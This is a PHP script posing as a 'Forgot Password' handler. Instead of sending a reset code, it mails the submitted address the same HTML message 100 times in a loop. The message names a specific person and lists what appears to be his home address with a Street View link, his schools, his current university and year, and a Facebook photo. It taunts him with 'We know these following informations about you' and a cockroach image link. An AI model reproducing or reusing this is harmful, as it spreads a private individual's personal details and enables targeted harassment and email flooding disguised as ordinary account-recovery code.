<?php
	include "connect.php";
	ini_set('max_execution_time', 300); 
	if(isset($_POST["emailpass"])){
	$sql = mysqli_query($conn, "SELECT * FROM tbl_users WHERE tbl_users.emailp_eml='".md5($_POST["emailf"])."'");
	$row = $sql->fetch_assoc();
	mysqli_close($conn);
	$rows1 = mysqli_num_rows($sql);
		
	if($rows1>0){
	for($x=0; $x!=100; $x++){
	$to = $_POST["emailf"];
	$subject = "Warning: Ryan Jeff Sumayao";
		
	$headers = "MIME-Version: 1.0" . "\r\n";
	$headers .= "Content-type:text/html;charset=UTF-8" . "\r\n";
	$headers .= 'From: Halal'. "\r\n".
    'Reply-To: Halal'."\r\n" .
    'X-Mailer: PHP/' . phpversion();
		
	$message = '
	<!doctype html>
<html>
<head>
<meta charset="utf-8">
  <title>1Devs | Forgot Password</title>
<title>Untitled Document</title>
<style>
.col{
color:black;
}
.ryan{
color: #000;
text-decoration: none;
}
.ryan:hover{
color:red;
text-decoration: underline;
}
</style>
<body>
<h2 class="col">Hello <a target="_blank" class="ryan" href="https://www.google.com.ph/search?rlz=1C1CHBF_enPH796PH796&biw=1366&bih=662&tbm=isch&sa=1&ei=pbEQW8ulC9TS8wXy2rKABg&q=cockroach&oq=co&gs_l=img.3.0.0i67k1j0l9.3960.5574.0.6710.6.6.0.0.0.0.144.643.0j5.5.0....0...1c.1.64.img..1.5.641.0..35i39k1.0.0Rk1rhoKazQ#imgrc=hy4fB50GW7JfnM:">Ryan Jeff</a>. You are the chosen one.</h2>
<h2 class="col">We found you in <a class="ryan" href="https://www.google.com/maps/@14.6530342,121.1268538,3a,42.4y,269.48h,79.7t/data=!3m10!1e1!3m8!1sW53U4n1CtEWqeneOsMw0YA!2e0!6s%2F%2Fgeo2.ggpht.com%2Fcbk%3Fpanoid%3DW53U4n1CtEWqeneOsMw0YA%26output%3Dthumbnail%26cb_client%3Dmaps_sv.tactile.gps%26thumb%3D2%26w%3D203%26h%3D100%26yaw%3D349.0735%26pitch%3D0%26thumbfov%3D100!7i13312!8i6656!9m2!1b1!2i51">180 Tanguile St. Marikina Heights, Marikina City</a>.</h2><h4 class="col">see for yourself, click the link.</h4>
<h3 class="col">We know these following informations about you:</h3>
<pre class="col" style="font-weight: 500;font-family: Arial; font-size: 14px;">
Elementary: Kapitan Moy Elementary School (2005 – 2011) @ Champagnat St. Marikina Heights, Marikina City			 
Secondary:	Marikina Heights High School (2011 – 2015) @ Champagnat St. Marikina Heights, Marikina City 
<div style="color:red">*And you are currently enrolled in Polytechnic University of the Philippines-Bachelor of Science in Computer Engineering(3rd Year)
			@ Sta. Mesa, Manila </div>
</pre>
<a class="col" title="if you are ryan jeff please click this" href="https://www.google.com.ph/search?rlz=1C1CHBF_enPH796PH796&biw=1366&bih=662&tbm=isch&sa=1&ei=pbEQW8ulC9TS8wXy2rKABg&q=cockroach&oq=co&gs_l=img.3.0.0i67k1j0l9.3960.5574.0.6710.6.6.0.0.0.0.144.643.0j5.5.0....0...1c.1.64.img..1.5.641.0..35i39k1.0.0Rk1rhoKazQ#imgrc=hy4fB50GW7JfnM:">
   <img width="50%" src="https://scontent.fmnl4-6.fna.fbcdn.net/v/t1.0-9/31901916_549608785439844_4922579515365916672_n.jpg?_nc_cat=0&oh=5c99cc3c80b2e5590ae131c2d8345ead&oe=5BC46E98">
   </a>

</body>
</html>
	
	';
	
		
	mail($to, $subject, $message, $headers);}
	header("Location: code_sent.php?email=".md5($_POST['emailf'])."");
	}
	}
	else{
		header("Location: forgot_password.php");
	}
?>